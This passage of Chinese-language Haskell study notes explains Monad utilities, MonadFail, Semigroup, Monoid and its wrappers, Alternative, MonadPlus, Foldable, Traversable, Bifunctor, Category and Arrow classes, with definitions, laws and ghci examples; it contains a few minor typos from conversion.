      sequence :: Monad m => [m a] -> m [a]

      sequence的作用显而易见，而且在IO部分也使用到了。但是这个版本是在 ``GHC.Base`` 模块中定义的，还有一个更广泛的使用Traversable的定义在 ``Data.Traversable`` 模块中

      .. rubric:: ` <#replicateM>`__ replicateM
         :name: replicateM

      replicateM :: Applicative m => Int -> m a -> m [a]

      .. rubric:: ` <#mapM-amp-forM>`__ mapM & forM
         :name: mapM-amp-forM

      mapM :: Monad m => (a -> m b) -> [a] -> m [b]

      forM :: Monad m => [a] -> (a -> m b) -> m [b]

      forM的用法在IO部分已经说过，mapM和forM都在 ``Data.Traversable`` 模块中有广泛版本

      还有一些其他的函数：filterM、zipWithM、foldM、forever，通过名字就可以看出用法，是将原来仅使用与列表的函数提升至可以适用于所有单子

      并且在函数名后加下划线，比如sequence\_、mapM\_，会忽略返回值（最终结果为 ``m ()`` ）

      .. rubric:: ` <#lt-lt-amp-gt-gt-amp-lt-lt>`__ =<< &
         >=> & <=<
         :name: lt-lt-amp-gt-gt-amp-lt-lt

      （ ``>=>`` 操作符在上面 `Monad
      Laws <#%E7%BB%84%E5%90%88%E8%BF%90%E7%AE%97%E7%AC%A6%EF%BC%88-gt-gt-%EF%BC%89%E5%BD%A2%E5%BC%8F>`__ 部分已经给出了定义）

      -  x >>= f ``=`` f =<< x
      -  f >=> g ``=`` g <=< f


   .. rubric:: ` <#MonadFail>`__ MonadFail
      :name: MonadFail

      MonadFail定义在 ``Control.Monad.Fail`` 模块中：

      .. container:: float highlight haskell
      ::

         class Monad m => MonadFail m where
             fail :: String -> m a 

      它只要求在Monad的基础上实现fail函数，接收一个字符串返回一个单子。这会使在do语句中产生错误时直接变为错误值（空值）使最终的返回值为错误值

      .. rubric:: ` <#MonadFail实例>`__ MonadFail实例
         :name: MonadFail实例

      .. container:: float highlight haskell
      ::

         instance MonadFail Maybe where
             fail _ = Nothing

         instance MonadFail [] where
             fail _ = []

         instance MonadFail IO where
             fail = failIO

      Maybe和[]的fail函数都与第一个参数无关，直接返回空值（Nothing、[]）；而IO的fail函数直接使用failIO，实现方法也是深奥（接着逃

      .. container:: float highlight haskell
      ::

         exampleFail :: Maybe Char 
         exampleFail = do
             (x:xs) <- Just ""
             return x 

         ghci> exampleFail
         Nothing

      在这个例子的do语句中，在提取Just
      “”中的值时用了模式匹配，但是因为其内容为空字符串，x:xs匹配会出现错误，这时就会触发fail函数直接返回Nothing

      .. rubric:: ` <#MonadFail-Law>`__ MonadFail Law
         :name: MonadFail-Law

      -  fail s >>= m ``=`` fail s


   .. rubric:: ` <#Semigroup>`__ Semigroup
      :name: Semigroup

      半群（semigroup）是一个集合$S$，它需要指定一个二元运算符$\\oplus$，并且满足

      | $$
      | a\\oplus b \\in S\\quad a, b\\in S
      | $$

      以及结合（associative）律：

      | $$
      | (a\\oplus b)\\oplus c = a\\oplus (b\\oplus c)
      | $$

      这个二元运算符在Haskell的Semigroup中被定义为 ``<>`` 函数：

      .. container:: float highlight haskell
      ::

         class Semigroup a where
             (<>) :: a -> a -> a 

             sconcat :: NonEmpty a -> a 
             sconcat (a :| as) = go a as where 
                 go b (c:cs) = b <> go c cs 
                 go b []     = b
             
             stimes :: Integarl b => b -> a -> a 
             stimes = ...

      除此之外还有 ``sconcat`` 和 ``stimes`` 函数，都给出了默认实现。对于列表，<>相当于(++)，stimes相当于concat
      . replicate：

      .. container:: float highlight haskell
      ::

         ghci> [1, 2] <> [3, 4]
         [1,2,3,4]
         ghci> sconcat $ fromList [[1, 2], [3, 4]]
         [1,2,3,4]
         ghci> stimes 3 [1, 2]
         [1,2,1,2,1,2]

      .. rubric:: ` <#Semigroup-Law>`__ Semigroup Law
         :name: Semigroup-Law

      -  (x <> y) <> z ``=`` x <> (y <> z)

      .. rubric:: ` <#补：NonEmpty>`__ 补：NonEmpty
         :name: 补：NonEmpty

      NonEmpty表示非空列表，定义是：

      .. container:: float highlight haskell
      ::

         data NonEmpty a = a :| [a] deriving (Eq, Ord)

      使用一个元素和一个列表用 ``:|`` 连接就可以生成一个NonEmpty类型的列表

      ``Data.List.NonEmpty`` 模块中实现了很多普通列表有的函数，需要qualified
      import后调用，使用fromList、toList函数可以在普通列表和非空列表之间转换

      .. container:: float highlight haskell
      ::

         ghci> import qualified Data.List.NonEmpty as NE
         ghci> arr = NE.fromList [1, 2, 3]
         ghci> arr
         1 :| [2,3]
         ghci> NE.head arr 
         1
         ghci> NE.tail arr 
         [2,3]


   .. rubric:: ` <#Monoid>`__ Monoid
      :name: Monoid

      幺半群（Monoid）是一个有单位元素$e$的半群，即$e$满足：

      | $$
      | e\\oplus x = x\\oplus e = x
      | $$

      .. container:: float highlight haskell
      ::

         class Semigroup a => Monoid a where 
             mempty  :: a 
             
             mappend :: a -> a -> a 
             mappend = (<>)

             mconcat :: [a] -> a 
             mconcat = foldr mappend mempty 

      可以看出Monoid要求了三个函数，其中最少只需要 ``mempty`` ，它直接返回一个值，表示单位元素。 ``mappend`` 即Semigroup中的<>运算符， ``mconcat`` 也提供了默认实现

      .. rubric:: ` <#实例>`__ 实例
         :name: 实例

      .. rubric:: ` <#a-1>`__ [a]
         :name: a-1

      因为Monoid的实例是一个具体类型，而不是像Functor等一样等类型构造器，所以[]并不是Monoid的实例，但是具体类型[a]是一个幺半群：

      .. container:: float highlight haskell
      ::

         instance Semigroup [a] where 
             (<>) = (++)

         instance Monoid [a] where 
             mempty = [] 
             mconcat xss = [x | xs <- xss, x <- xs]

      列表的单位元素(mempty)就是空列表[]，运算符就是合并列表(++)，mconcat也用列表推导重新实现提高效率

      .. container:: float highlight haskell
      ::

         ghci> mempty :: [Int] 
         []
         ghci> [1, 2] <> [3, 4]
         [1,2,3,4]
         ghci> [1, 2] `mappend` [3, 4]
         [1,2,3,4]
         ghci> mconcat [[1,2], [3,4]]
         [1,2,3,4]

      .. rubric:: ` <#Ordering>`__ Ordering
         :name: Ordering

      .. container:: float highlight haskell
      ::

         instance Semigroup Ordering where
             LT <> _ = LT
             EQ <> y = y
             GT <> _ = GT

         instance Monoid Ordering where
             mempty = EQ

      主要可以用于比较字典序：

      .. container:: float highlight haskell
      ::

         ghci> mconcat (zipWith compare "abcd" "acbd")
         LT

      .. rubric:: ` <#Sum-amp-Product>`__ Sum & Product
         :name: Sum-amp-Product

      对于数字，加法和乘法都满足结合律，所以对于Num，有两种实现Monoid的方式，但是不能为同一类型设置两种实例方式，所以 ``Data.Monoid`` 中提供了两个包装器————Sum和Product：

      .. container:: float highlight haskell
      ::

         newtype Sum a = Sum {getSum :: a} deriving (...)
         newtype Product a = Product {getProduct :: a} deriving (...)

      它们使用Sum或Product来包装起一个数字，可以通过getSum或getProduct来获取其中的值

      对于加法，二元操作为(+)，单位元素为0；对于乘法，二元操作为(\*)，单位元素为1:

      .. container:: float highlight haskell
      ::

         instance Num a => Semigroup (Sum a) where
             (<>) = coerce ((+) :: a -> a -> a)

         instance Num a => Monoid (Sum a) where
             mempty = Sum 0

         instance Num a => Semigroup (Product a) where
             (<>) = coerce ((*) :: a -> a -> a)

         instance Num a => Monoid (Product a) where
             mempty = Product 1

      .. container:: float highlight haskell
      ::

         ghci> Sum 5 <> Sum 6 <> Sum 10
         Sum {getSum = 21}
         ghci> getSum . mconcat . fmap Sum $ [5, 6, 10]
         21
         ghci> Product 5 <> Product 6 <> Product 10
         Product {getProduct = 300}
         ghci> getProduct . mconcat . fmap Product $ [5, 6, 10]
         300

      .. rubric:: ` <#All-amp-Any>`__ All & Any
         :name: All-amp-Any

      和数字一样，布尔值也有两种实现Monoid的方式，因此 ``Data.Monoid`` 模块中也提供了两个包装器，分别实现了这两种Monoid：

      .. container:: float highlight haskell
      ::

         newtype All = All { getAll :: Bool } deriving (...)

         instance Semigroup All where
                 (<>) = coerce (&&)

         instance Monoid All where
                 mempty = All True


         newtype Any = Any { getAny :: Bool } deriving (...)

         instance Semigroup Any where
                 (<>) = coerce (||)

         instance Monoid Any where
                 mempty = Any False

      .. container:: float highlight haskell
      ::

         ghci> getAll (All True <> mempty <> All False)
         False
         ghci> getAll (mconcat (map (\x -> All (even x)) [2,4,6,7,8]))
         False
         ghci> getAny (Any True <> mempty <> Any False)
         True
         ghci> getAny (mconcat (map (\x -> Any (even x)) [2,4,6,7,8]))
         True

      .. rubric:: ` <#Monoid-a-gt-Maybe-a>`__ Monoid a =>
         Maybe a
         :name: Monoid-a-gt-Maybe-a

      如果a是一个(幺)半群，那么Maybe
      a也是一个幺半群，单位元就是Nothing：

      .. container:: float highlight haskell
      ::

         instance Semigroup a => Semigroup (Maybe a) where
             Nothing <> b       = b
             a       <> Nothing = a
             Just a  <> Just b  = Just (a <> b)

         instance Semigroup a => Monoid (Maybe a) where
             mempty = Nothing

      .. container:: float highlight haskell
      ::

         ghci> Nothing <> Just "andy"
         Just "andy"
         ghci> Just LT <> Nothing
         Just LT
         ghci> Just (Sum 3) <> Just (Sum 4) 
         Just (Sum {getSum = 7})

      .. rubric:: ` <#First-amp-Last>`__ First & Last
         :name: First-amp-Last

      对于Maybe也有两种实现Monoid的方法，即<>操作每次恒取左边和每次恒取右边（在没有Nothing的情况下），所以 ``Data.Monoid`` 模块中也提供了两个新的包装器：First和Last：

      .. container:: float highlight haskell
      ::

         newtype First a = First { getFirst :: Maybe a } deriving (...)

         instance Semigroup (First a) where
             First Nothing <> b = b
             a             <> _ = a

         instance Monoid (First a) where
             mempty = First Nothing


         newtype Last a = Last { getLast :: Maybe a } deriving (...)

         instance Semigroup (Last a) where
             a <> Last Nothing = a
             _ <> b            = b

         instance Monoid (Last a) where
             mempty = Last Nothing

      .. container:: float highlight haskell
      ::

         ghci> getFirst (First (Just "hello") <> First Nothing <> First (Just "world"))
         Just "hello"
         ghci> getLast (Last (Just "hello") <> Last Nothing <> Last (Just "world"))
         Just "world"
         ghci> getFirst . mconcat . map First $ [Nothing, Just 9, Just 10]  
         Just 9
         ghci> getLast . mconcat . map Last $ [Nothing, Just 9, Just 10]  
         Just 10

      .. rubric:: ` <#Min-amp-Max>`__ Min & Max
         :name: Min-amp-Max

      对于有界的类型，也有两种实现Monoid的方式，每次二元操作都取最小或最大。 ``Data.Semigroup`` 模块中提供了两个包装其器：Min和Max：

      .. container:: float highlight haskell
      ::

         newtype Min a = Min { getMin :: a } deriving (...)

         instance Ord a => Semigroup (Min a) where
             (<>) = coerce (min :: a -> a -> a)

         instance (Ord a, Bounded a) => Monoid (Min a) where
             mempty = maxBound


         newtype Max a = Max { getMax :: a } deriving (...)

         instance Ord a => Semigroup (Max a) where
             (<>) = coerce (max :: a -> a -> a)

         instance (Ord a, Bounded a) => Monoid (Max a) where
             mempty = minBound

      .. container:: float highlight haskell
      ::

         ghci> Min 3 <> Min 5
         Min {getMin = 3}
         ghci> Max 3 <> Max 5
         Max {getMax = 5}
         ghci> getMin . mconcat . map Min $ [1,2,3] :: Int
         1
         ghci> getMax . mconcat . map Max $ [1,2,3] :: Int
         3

      .. rubric:: ` <#元组>`__ 元组
         :name: 元组

      当元组内的所有元素都是幺半群时，整个元组也是一个幺半群：

      .. container:: float highlight haskell
      ::

         instance (Semigroup a, Semigroup b) => Semigroup (a, b) where
                 (a,b) <> (a',b') = (a<>a',b<>b')
                 stimes n (a,b) = (stimes n a, stimes n b)

         instance (Monoid a, Monoid b) => Monoid (a,b) where
                 mempty = (mempty, mempty)

      .. container:: float highlight haskell
      ::

         ghci> mconcat $ map (\x -> (Min x, Max x)) [1..10] :: (Min Int, Max Int)
         (Min {getMin = 1},Max {getMax = 10})

      .. rubric:: ` <#Monoid-Laws>`__ Monoid Laws
         :name: Monoid-Laws

      -  mempty <> x ``=`` x
      -  x <> mempty ``=`` x
      -  (x <> y) <> z ``=`` x <> (y <> z)


   .. rubric:: ` <#Monoidal-classes>`__ Monoidal classes
      :name: Monoidal-classes

      Applicative、Monad、Arrow都有有幺半群性质的子类型类，分别是Alternative、MonadPlus、ArrowPlus

      .. rubric:: ` <#Alternative>`__ Alternative
         :name: Alternative

      .. container:: float highlight haskell
      ::

         class Applicative f => Alternative f where
             -- | The identity of '<|>'
             empty :: f a
             -- | An associative binary operation
             (<|>) :: f a -> f a -> f a

             some :: f a -> f [a]
             some v = (:) <$> v <*> many v
             many :: f a -> f [a]
             many v = some v <|> pure []

      其中empty是幺半群中的单位元素，<\|>是幺半群中的二元运算符。some和many是两个函数（ [STRIKEOUT:意义还不懂] ）

      .. rubric:: ` <#Alternative实例>`__ Alternative实例
         :name: Alternative实例

      .. rubric:: ` <#-3>`__ []
         :name: -3

      .. container:: float highlight haskell
      ::

         instance Alternative [] where
             empty = []
             (<|>) = (++)

      和Monoid一样，单位元素是空列表，二元运算是列表合并

      .. container:: float highlight haskell
      ::

         ghci> [1,2,3] <|> empty <|> [4,5]
         [1,2,3,4,5]
         ghci> some []
         []
         ghci> many []
         [[]]

      .. rubric:: ` <#Maybe-3>`__ Maybe
         :name: Maybe-3

      .. container:: float highlight haskell
      ::

         instance Alternative Maybe where
             empty = Nothing
             Nothing <|> r = r
             l       <|> _ = l

      Maybe作为Alternative的单位元素是Nothing，二元运算是始终取左边（当左边不为Nothing时）

      .. container:: float highlight haskell
      ::

         ghci> Nothing <|> Just 1 <|> Just 2 
         Just 1 
         ghci> some Nothing
         Nothing 
         ghci> many Nothing 
         Just []

      .. rubric:: ` <#ZipList-1>`__ ZipList
         :name: ZipList-1

      .. container:: float highlight haskell
      ::

         instance Alternative ZipList where
            empty = ZipList []
            ZipList xs <|> ZipList ys = ZipList (xs ++ drop (length xs) ys)

      .. container:: float highlight haskell
      ::

         <>getZipList $ ZipList [1,2] <|> ZipList [3,4,5,6]
         [1,2,5,6]
         <>getZipList $ ZipList [1,2,3,4] <|> ZipList [3,4,5,6]
         [1,2,3,4]

      .. rubric:: ` <#Alternative-Laws>`__ Alternative Laws
         :name: Alternative-Laws

      -  ``Monoid laws``:

         .. container:: float highlight haskell
         ::

            empty <|> x = x 
            x <|> empty = x 
            (x <|> y) <|> z = x <|> (y <|> z)

      -  ``Left zero law`` ：empty <\*> f ``=`` empty
         以上的定律是都满足都，下面的定律只有部分满足：
      -  ``Right zero law`` ：f <\*> empty ``=`` empty
         （大部分包括Maybe、[]满足，IO不满足）
      -  ``Left distribution`` ：(a <\|> b) <\*> c ``=`` (a
         <\*> c) <\|> (b <\*> c)
         （Maybe、[]满足，IO及大部分parsers不满足）
      -  ``Right distribution`` ：a <\*> (b <\|> c) ``=``
         (a <\*> b) <\|> (a <\*> c)
         （大部分不满足，但Maybe满足）
      -  ``Left catch`` ：(pure a) <\|> x = pure a
         （Maybe、IO、parsers满足，但[]不满足）

      .. rubric:: ` <#常用函数-3>`__ 常用函数
         :name: 常用函数-3

      -  ``asum`` :: (Foldable t, Alternative f) => t (f a)
         -> f a，相当于foldr (<\|>) empty：

         .. container:: float highlight haskell
         ::

            ghci> asum [Nothing, Just 5, Just 3]
            Just 5
            ghci> asum [[2],[3],[4,5]]
            [2,3,4,5]

      -  ``guard`` :: (Alternative f) => Bool -> f ()：

         .. container:: float highlight haskell
         ::

            guard True  = pure ()
            guard False = empty 

      .. rubric:: ` <#MonadPlus>`__ MonadPlus
         :name: MonadPlus

      .. container:: float highlight haskell
      ::

         class (Alternative m, Monad m) => MonadPlus m where
            mzero :: m a
            mzero = empty

            mplus :: m a -> m a -> m a
            mplus = (<|>)

      .. rubric:: ` <#MonadPlus实例>`__ MonadPlus实例
         :name: MonadPlus实例

      []、Maybe都是MonadPlus的实例，mzero和mplus都由Alternative实现

      .. rubric:: ` <#MonadPlus-Laws>`__ MonadPlus Laws
         :name: MonadPlus-Laws

      -  ``Monoid laws``
      -  ``Left zero`` ：mzero >>= f ``=`` mzero
      -  ``Right zero`` ：m >> mzero ``=`` mzero

      .. rubric:: ` <#常用函数-4>`__ 常用函数
         :name: 常用函数-4

      -  ``msum`` = asum
      -  ``mfilter`` ：

         .. container:: float highlight haskell
         ::

            mfilter p ma = do
                a <- ma
                if p a then return a else mzero

      .. rubric:: ` <#ArrowPlus>`__ ArrowPlus
         :name: ArrowPlus

      ArrowZero和ArrowPlus分别为Arrow设置了Monoid中的单位元素和二元运算符，使之成为了一个幺半群：

      .. container:: float highlight haskell
      ::

         class Arrow arr => ArrowZero arr where
             zeroArrow :: b `arr` c

         class ArrowZero arr => ArrowPlus arr where
             (<+>) :: (b `arr` c) -> (b `arr` c) -> (b `arr` c)


   .. rubric:: ` <#一些其它typeclasses>`__ 一些其它typeclasses
      :name: 一些其它typeclasses

      .. rubric:: ` <#Foldable>`__ Foldable
         :name: Foldable

      Foldable是表示可以折叠（fold）的类型类，在 ``Data.Foldable`` 中定义，这使得和fold相关的函数可以用在任意Foldable的实例类型上。它的定义是：

      .. container:: float highlight haskell
      ::

         class Foldable t where
             fold     :: Monoid m => t m -> m
             foldMap  :: Monoid m => (a -> m) -> t a -> m
             foldMap' :: Monoid m => (a -> m) -> t a -> m
             foldr    :: (a -> b -> b) -> b -> t a -> b
             foldr'   :: (a -> b -> b) -> b -> t a -> b
             foldl    :: (b -> a -> b) -> b -> t a -> b
             foldl'   :: (b -> a -> b) -> b -> t a -> b
             foldr1   :: (a -> a -> a) -> t a -> a
             foldl1   :: (a -> a -> a) -> t a -> a
             toList   :: t a -> [a]
             null     :: t a -> Bool
             length   :: t a -> Int
             elem     :: Eq a => a -> t a -> Bool
             maximum  :: Ord a => t a -> a
             minimum  :: Ord a => t a -> a
             sum      :: Num a => t a -> a
             product  :: Num a => t a -> a
             {-# MINIMAL foldMap | foldr #-}

      最少只要实现 ``foldr`` 和 ``foldMap`` 其中之一就可以使一个类型成为Foldable的实例，其它的函数都有由这两个函数提供的默认实现，而且这两个函数之间也有相互实现。因此只要实现foldr或foldMap一个函数就可以使用所有其它Foldable中的函数。foldr函数在前面已经有学过，foldMap的例子是：

      .. container:: float highlight haskell
      ::

         ghci> foldMap Sum [1, 3, 5]
         Sum {getSum = 9}
         ghci> foldMap Product [1, 3, 5]
         Product {getProduct = 15}
         ghci> foldMap (replicate 3) [1, 2, 3]
         [1,1,1,2,2,2,3,3,3]

      .. rubric:: ` <#Foldable实例>`__ Foldable实例
         :name: Foldable实例

      []、Maybe、Either a、(,)
      a都是Foldable的实例，标准容器库中的Map、Set等也都是Foldable的实例。也可以自定义二叉树类型，并使其成为Foldable的实例：

      .. container:: float highlight haskell
      ::

         data Tree a = Empty | Leaf a | Node (Tree a) a (Tree a)

         instance Foldable Tree where 
             foldMap :: Monoid m => (a -> m) -> Tree a -> m
             foldMap f Empty        = mempty
             foldMap f (Leaf x)     = f x
             foldMap f (Node l k r) = foldMap f l `mappend` f k `mappend` foldMap f r

      .. rubric:: ` <#常用函数-5>`__ 常用函数
         :name: 常用函数-5

      -  ``asum`` :: (Alternative f, Foldable t) => t (f a)
         -> f a，用<\|>逐个连接所有元素
      -  ``sequenceA_`` :: (Applicative f, Foldable t) => t
         (f a) -> f ()，由于丢弃结果，所以Foldable
         t就可以满足；因此不同于sequenceA需要Traversable
      -  ``traverse_`` :: (Applicative f, Foldable t) => (a
         -> f b) -> t a -> f ()
      -  ``for_`` :: (Applicative f, Foldable t) => t a ->
         (a -> f b) -> f ()

      .. rubric:: ` <#Traversable>`__ Traversable
         :name: Traversable

      Traversable是表示可遍历的类型类，在 ``Data.Traversable`` 模块中定义，它是Foldable的升级版，同时也是一个Functor，它的定义是：

      .. container:: float highlight haskell
      ::

         class (Functor t, Foldable t) => Traversable t where 
             traverse  :: Applicative f => (a -> f b) -> t a -> f (t b)
             sequenceA :: Applicative f => t (f a) -> f (t a)
             mapM      ::       Monad m => (a -> m b) -> t a -> m (t b)
             sequence  ::       Monad m => t (m a) -> m (t a)
             {-# MINIMAL traverse | sequenceA #-}

      最少只需要实现traverse函数或者sequenceA函数。其中各个函数的功能通过类型签名也都能推测出来。但是其中mapM就是traverse，sequence就是sequenceA，它们存在只是历史遗留（

      .. rubric:: ` <#Traversable实例>`__ Traversable实例
         :name: Traversable实例

      .. container:: float highlight haskell
      ::

         instance Traversable Maybe where
             traverse _ Nothing = pure Nothing
             traverse f (Just x) = Just <$> f x

         instance Traversable [] where
             {-# INLINE traverse #-}
             traverse f = foldr cons_f (pure [])
               where cons_f x ys = liftA2 (:) (f x) ys

         instance Traversable (Either a) where
             traverse _ (Left x) = pure (Left x)
             traverse f (Right y) = Right <$> f y

         instance Traversable ((,) a) where
             traverse f (x, y) = (,) x <$> f y

         ...

      上面的Tree也可以成为Traversable的实例：

      .. container:: float highlight haskell
      ::

         instance Functor Tree where
             fmap :: (a -> b) -> Tree a -> Tree b
             fmap     g Empty        = Empty
             fmap     g (Leaf x)     = Leaf $ g x
             fmap     g (Node l x r) = Node (fmap g l)
                                            (g x)
                                            (fmap g r)

         instance Traversable Tree where
             traverse :: Applicative f => (a -> f b) -> Tree a -> f (Tree b) 
             traverse g Empty        = pure Empty
             traverse g (Leaf x)     = Leaf <$> g x
             traverse g (Node l x r) = Node <$> traverse g l
                                            <*> g x
                                            <*> traverse g r

      .. rubric:: ` <#Traversable-Laws>`__ Traversable Laws
         :name: Traversable-Laws

      Traversable也有两条定律：

      #. traverse Identity ``=`` Identity
      #. traverse (Compose . fmap g . f) ``=`` Compose .
         fmap (traverse g) . traverse f

      其中Identity和Compose分别定义在 ``Data.Functor.Identity`` 和 ``Data.Functor.Compose`` 两个模块中：

      .. container:: float highlight haskell
      ::

         newtype Identity a = Identity { runIdentity :: a } deriving (...)
         newtype Compose f g a = Compose { getCompose :: f (g a) } deriving (...)

      .. rubric:: ` <#Bifunctor>`__ Bifunctor
         :name: Bifunctor

      Functor的实例的kind都是\* ->
      \*，因此fmap只能将一个函数映射到一个值上。而Bifunctor（在 ``Data.Bifunctor`` 模块中定义）的实例的kind是\*
      -> \* ->
      \*，而且它的bimap可以同时将两个函数映射到两个值上：

      .. container:: float highlight haskell
      ::

         class Bifunctor p where 
             bimap  :: (a -> b) -> (c -> d) -> p a c -> p b d 
             first  :: (a -> b) -> p a c -> p b c 
             second :: (b -> c) -> p a b -> p a c 
             {-# MINIMAL bimap | first, second #-}

      同时bimap和first,second之间也可以相互转换：

      .. container:: float highlight haskell
      ::

         bimap f g = first f . second g

         first  f = bimap f id
         second g = bimap id g

      对于Functor，((,) e)和Either
      e才是Functor的实例，因为他们是\* ->
      \*。但是对于Bifunctor，(,)和Either就是Bifunctor的实例：

      .. container:: float highlight haskell
      ::

         ghci> bimap (+1) length (4, [1,2,3])
         (5,3)

      .. rubric:: ` <#Bifunctor-Laws>`__ Bifunctor Laws
         :name: Bifunctor-Laws

      #. bimap id id ``=`` id
         first id ``=`` id
         second id ``=`` id
      #. bimap (f . g) (h . i) ``=`` bimap f h . bimap g i
         first (f . g) ``=`` first f . first g
         second (f . g) ``=`` second f . second g

      .. rubric:: ` <#Category>`__ Category
         :name: Category

      Haskell 中的 Category 将一般的函数推广到了普遍的态射上，它在 ``Control.Category`` 模块中，定义是：

      .. container:: float highlight haskell
      ::

         class Category cat where 
             id  :: cat a a 
             (.) :: cat b c -> cat a b -> cat a c

      它的实例有 ``(->)`` 和 ``Kleisli m`` ：

      .. container:: float highlight haskell
      ::

         instance Category (->) where
             id = GHC.Base.id
             (.) = (GHC.Base..)

      Kleisli是一个范畴，用来表示函数a -> m
      b，Haskell中，它在 ``Control.Arrow`` 模块中定义：

      .. container:: float highlight haskell
      ::

         newtype Kleisli m a b = Kleisli { runKleisli :: a -> m b }

         instance Monad m => Category (Kleisli m) where
             id :: Kleisli m a a
             id = Kleisli return

             (.) :: Kleisli m b c -> Kleisli m a b -> Kleisli m a c
             Kleisli g . Kleisli h = Kleisli (h >=> g)

      Category要满足的定律只有id是(.)操作的单位元，以及(.)操作是可结合的

      同时Category还提供了两个函数 ``<<<`` 和 ``>>>`` ：

      .. container:: float highlight haskell
      ::

         (<<<) :: Category cat => cat b c -> cat a b -> cat a c
         (<<<) = (.)

         (>>>) :: Category cat => cat a b -> cat b c -> cat a c 
         f >>> g = g . f 

      .. rubric:: ` <#Arrow>`__ Arrow
         :name: Arrow

      Arrow将函数进一步抽象化，它定义在 ``Control.Arrow`` 模块中：

      .. container:: float highlight haskell
      ::

         class Category a => Arrow a where 
             arr    :: (b -> c) -> a b c 
             first  :: a b c -> a (b, d) (c, d)
             second :: a b c -> a (d, b) (d, c)
             (***)  :: a b c -> a b' c' -> a (b, b') (c, c')
             (&&&)  :: a b c -> a b c' -> a b (c, c')
             {-# MINIMAL arr, (first | (***)) #-}

      其中：

      -  ``arr`` 函数将一个函数变成一个Arrow
      -  ``first`` 函数将一个Arrow变成一个二元组间的Arrow，且只会对一个元素进行操作，第二个元素保持不变
      -  ``second`` 函数与first相反，第一个元素保持不变
      -  ``***`` 函数是Arrow之间的parallel
         composition，对于函数: (g \**\* h) (x, y) = (g x, h
         y)
      -  ``&&&`` 函数是Arrow之间的fanout
         composition，对于函数: (g &&& h) x = (g x, h x)

      它的实例也有(->)和Kleisli：

      .. container:: float highlight haskell
      ::

         instance Arrow (->) where
           arr :: (b -> c) -> (b -> c)
           arr g = g

           first :: (b -> c) -> ((b,d) -> (c,d))
           first g (x,y) = (g x, y)

         instance Monad m => Arrow (Kleisli m) where
           arr :: (b -> c) -> Kleisli m b c
           arr f = Kleisli (return . f)

           first :: Kleisli m b c -> Kleisli m (b,d) (c,d)
           first (Kleisli f) = Kleisli ( ~(b,d) -> do c <- f b
                                                       return (c,d) )

      常用函数：

      .. container:: float highlight haskell
      ::

         returnA :: Arrow a => a b b
         returnA = arr id

         (^>>) :: Arrow a => (b -> c) -> a c d -> a b d
         f ^>> a = arr f >>> a

         (>>^) :: Arrow a => a b c -> (c -> d) -> a b d
         a >>^ f = a >>> arr f

         (<<^) :: Arrow a => a c d -> (b -> c) -> a b d
         a <<^ f = a <<< arr f

         (^<<) :: Arrow a => (c -> d) -> a b c -> a b d
         f ^<< a = arr f <<< a

      .. rubric:: ` <#Arrow-notation>`__ Arrow notation
         :name: Arrow-notation

      类似do-notation，Arrow也提供了一套方便的语句：

      .. container:: float highlight haskell
      ::

         proc x -> do 
             y <- action1 -< ... 
             z <- action2 -< ...
             returnA -< ...

      其中proc代替了lambda表达式中的斜杠\\，-<右边的为输入，左边的为接收输入的函数。比如，下面三种写法达成的效果是一样的：

      .. container:: float highlight haskell
      ::

         f :: Int -> (Int, Int)
         f = \x ->
             let y  = 2 * x
                 z1 = y + 3
                 z2 = y - 5
             in (z1, z2) 
         -- ghci> f 10 
         -- (23,15)

         fM :: Int -> Identity (Int, Int)
         fM = \x -> do
             y  <- return (2 * x)
             z1 <- return (y + 3)
             z2 <- return (y - 5)
             return (z1, z2)

         -- ghci> runIdentity (fM 10)
         -- (23,15)

         fA :: Int -> (Int, Int)
         fA = proc x -> do
             y  <- (2 *) -< x
             z1 <- (+ 3) -< y
             z2 <- (subtract 5) -< y
             returnA -< (z1, z2)

         -- ghci> fA 10
         -- (23,15)

      .. rubric:: ` <#ArrowChoice>`__ ArrowChoice
         :name: ArrowChoice

      .. container:: float highlight haskell
      ::

         class Arrow a => ArrowChoice a where
             left :: a b c -> a (Either b d) (Either c d)
             left = (+++ id)

             right :: a b c -> a (Either d b) (Either d c)
             right = (id +++)

             (+++) :: a b c -> a b' c' -> a (Either b b') (Either c c')
             f +++ g = left f >>> arr mirror >>> left g >>> arr mirror
               where
                 mirror :: Either x y -> Either y x
                 mirror (Left x) = Right x
                 mirror (Right y) = Left y

             (|||) :: a b d -> a c d -> a (Either b c) d
             f ||| g = f +++ g >>> arr untag
               where
                 untag (Left x) = x
                 untag (Right y) = y

         instance ArrowChoice (->) where
             left f = f +++ id
             right f = id +++ f
             f +++ g = (Left . f) ||| (Right . g)
             (|||) = either

         instance Monad m => ArrowChoice (Kleisli m) where
             left f = f +++ arr id
             right f = arr id +++ f
             f +++ g = (f >>> arr Left) ||| (g >>> arr Right)
             Kleisli f ||| Kleisli g = Kleisli (either f g)

      .. rubric:: ` <#ArrowZero-amp-ArrowPlus>`__ ArrowZero
         & ArrowPlus
         :name: ArrowZero-amp-ArrowPlus

      .. container:: float highlight haskell
      ::

         class Arrow a => ArrowZero a where
             zeroArrow :: a b c

         class ArrowZero a => ArrowPlus a where
             (<+>) :: a b c -> a b c -> a b c

         instance MonadPlus m => ArrowZero (Kleisli m) where
             zeroArrow = Kleisli (\_ -> mzero)

         instance MonadPlus m => ArrowPlus (Kleisli m) where
             Kleisli f <+> Kleisli g = Kleisli (\x -> f x `mplus` g x)

      .. rubric:: ` <#例子>`__ 例子
         :name: 例子

      .. container:: float highlight haskell
      ::

         ghci> runKleisli ((Kleisli (\x -> [x * 2])) <+> (Kleisli (\x -> [x, -x]))) 2
         [4,2,-2]
         ghci> either (+2) (*3) (Left 3)
         5
         ghci> either (+2) (*3) (Right 3)
         9
         ghci> (+2) ||| (*3) $ (Left 3)
         5
         ghci> (+2) +++ (*3) $ (Left 3)
         Left 5
         ghci> (+2) ||| (*3) $ (Right 3)
         9
         ghci> (+2) +++ (*3) $ (Right 3)
         Right 9
         ghci> left (+2) (Left 3)
         Left 5
         ghci> right (*3) (Right 3)
         Right 9
         ghci> left (+2) (Right 3)
         Right 3
         ghci> right (*3) (Left 3)
         Left 3
         ghci> runKleisli ((Kleisli (\x -> [x * 2])) ||| (Kleisli (\x -> [x, -x]))) (Left 3)
         [6]
         ghci> runKleisli ((Kleisli (\x -> [x * 2])) ||| (Kleisli (\x -> [x, -x]))) (Right 3)
         [3,-3]
         ghci> runKleisli ((Kleisli (\x -> [x * 2])) +++ (Kleisli (\x -> [x, -x]))) (Left 3)
         [Left 6]
         ghci> runKleisli ((Kleisli (\x -> [x * 2])) +++ (Kleisli (\x -> [x, -x]))) (Right 3)
         [Right 3,Right (-3)]


